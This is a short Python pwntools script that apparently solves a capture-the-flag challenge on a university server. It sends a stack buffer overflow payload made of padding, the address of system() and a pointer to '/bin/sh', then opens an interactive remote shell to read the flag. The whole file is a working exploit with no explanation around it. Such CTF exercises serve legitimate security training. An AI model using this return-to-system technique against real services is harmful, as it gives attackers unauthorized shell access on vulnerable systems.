#!/usr/bin/env python
from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 10101

context.arch = "i386"
context.os = "linux"

e = ELF("bin")
PADD = b'X' * 140
SYS = p32(e.symbols["system"])
RET = b'X' * 4
ARG = p32(next(e.search("/bin/sh")))

s = remote(SERVER, PORT)
s.sendline(PADD + SYS + RET + ARG)
s.clean()
s.interactive() # cat /home/ctf/flag
s.close()
